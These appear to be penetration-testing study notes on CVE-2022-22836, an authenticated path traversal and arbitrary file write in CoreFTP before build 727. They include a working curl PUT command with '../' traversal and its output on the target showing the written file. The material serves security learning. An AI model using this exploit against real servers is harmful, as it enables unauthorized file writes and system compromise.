*  `CoreFTP before build 727` vulnerability assigned [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)
*  FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability

## The Concept of the Attack
* This FTP service uses an HTTP `POST` request to upload files
* CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files

```sh
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

* Create a HTTP `PUT` request (`-X PUT`)
* With basic auth (`--basic -u <username>:<password>`)
* The path for the file (`--path-as-is https://<IP>/../../../../../whoops`)
* And its content (`--data-binary "PoC."`)
* Also a host header (`-H "Host: <IP>"`) with the IP address of our target system
* The filename specified (`whoops`) with the desired content (`"PoC."`) now serves as the destination on the local system

#### Target System
```powershell
C:\> type C:\whoops

PoC.
```